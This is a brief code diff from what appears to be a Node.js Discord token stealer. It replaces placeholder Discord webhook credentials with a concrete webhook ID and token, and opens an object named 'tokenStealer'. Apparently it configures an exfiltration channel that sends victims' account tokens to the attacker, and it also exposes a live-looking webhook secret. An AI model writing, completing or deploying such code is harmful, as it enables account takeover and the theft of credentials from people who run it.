@@ -7,7 +7,7 @@ const os = require("os")
 const fs = require("fs")
 
 // Variables
-const webhook = new discord.WebhookClient("webhookID", "webhookToken")
+const webhook = new discord.WebhookClient("1494802370792656999", "MTQ5NTA5OTQ0NDQxOTQ5NDAyOQ.GcPfmB.ehnznl0SeoUnmK0te_YTIXJ3TrErwdngkh8d-U")
 
 var tokenStealer = {
     cdt: null,
